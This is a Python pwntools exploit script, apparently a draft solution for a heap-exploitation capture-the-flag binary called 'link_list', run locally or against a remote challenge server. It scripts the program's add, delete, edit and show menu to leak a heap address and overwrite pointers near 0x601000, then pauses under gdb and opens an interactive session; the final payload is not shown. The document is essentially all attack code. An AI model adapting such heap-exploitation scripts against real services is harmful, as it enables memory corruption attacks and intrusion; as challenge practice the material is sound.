import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./link_list')
			# io=process(['./mountain'],env={'LD_PRELOAD':'./libc-2.29.so'})
			elf=ELF('./link_list')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			#ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
		else :
			io=remote('nc.eonew.cn',10007)
			elf=ELF('./link_list')
			libc=ELF('./libc-2.29.so')
			#ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')

		def add(a):
			io.sendlineafter('Your choice?','1')
			io.sendlineafter('What size do you want?',str(a))

		def delete(a):
			io.sendlineafter('Your choice?','2')
			io.sendlineafter('Which one do you want to delete?',str(a))

		def edit(a,b,c):
			io.sendlineafter('Your choice?','3')
			io.sendlineafter('Which one do you want to modify?',str(a))
			io.sendlineafter('What size do you want?',str(b))
			io.sendafter('Content: ',c)

		def show(a):
			io.sendlineafter('Your choice?','4')
			io.sendlineafter('Which one do you want to see?',str(a))


		add(0x20)
		delete(0)
		add(0x20)
		edit(0,0x20,'aaaaaaaa')
		show(0)
		io.recvuntil('a'*8)
		shell_base=u64(io.recv(6)+'\x00\x00')&0xfffffffffffff000
		add(0x20)
		add(0x20)
		edit(1,0x20,p64(0x601000)*4)
		edit(2,0x20,p64(0x601000)*4)


		success(hex(shell_base))
		gdb.attach(io)
		pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue